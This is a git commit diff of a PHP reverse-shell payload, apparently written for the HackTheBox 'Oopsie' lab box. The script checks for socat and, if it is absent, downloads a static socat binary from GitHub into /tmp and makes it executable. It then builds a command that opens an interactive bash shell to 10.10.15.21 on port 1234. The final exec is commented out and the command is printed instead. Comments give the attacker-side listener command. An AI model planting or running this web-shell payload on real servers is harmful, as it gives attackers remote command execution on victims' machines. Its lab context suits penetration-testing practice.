51bc76622112bdac8ded2c5c834a0f1aa5944a04
Henry Post <HenryFBP@gmail.com>
2021-03-25 17:05:38 -0500

    work on shell3

--- boxes/oopsie/payload/shell3.php
+++ boxes/oopsie/payload/shell3.php
@@ -1,37 +1,35 @@
 <?php
 
 $cmd = 'socat';
-$ip='10.10.15.21';
-$port='1234';
+$ip = '10.10.15.21';
+$port = '1234';
 
-$out=null;
+$out = null;
 
 if (`which socat`) {
     echo "socat exists!";
-
-
 } else {
     echo "socat does not exist!";
 
-    exec("wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat", $output, $out);
-    echo $out;
+    echo shell_exec("wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat"), "\n";
 
-    exec("chmod +x /tmp/socat", $output, $out);
-    echo $out;
+    echo shell_exec("chmod +x /tmp/socat"), "\n";
 
-    exec("ls -lash /tmp/socat", $output, $out);
-    echo $out;
-    
-    exec("ls /tmp", $output, $out);
-    echo $out;
+    echo shell_exec("ls -lash /tmp/socat"), "\n";
 
-    echo 'asdf :3';
+    echo shell_exec("ls /tmp"), "\n";
+
 
     $cmd = '/tmp/socat';
-
 }
 
-// exec($cmd . " tcp:".$ip.":".$port." exec:'bash -i' ,pty,stderr,setsid,sigint,sane &");
+$command = $cmd . " tcp:".$ip.":".$port." exec:'bash -i' ,pty,stderr,setsid,sigint,sane &";
+
+echo "Running this:";
+
+echo $command;
+
+// exec($command);
 
 // run this on attacker machine:    socat file:`tty`,raw,echo=0 tcp-listen:1234
 // pretend to be victim:            socat tcp-connect:localhost:1234 exec:/bin/sh,pty,stderr,setsid,sigint,sane
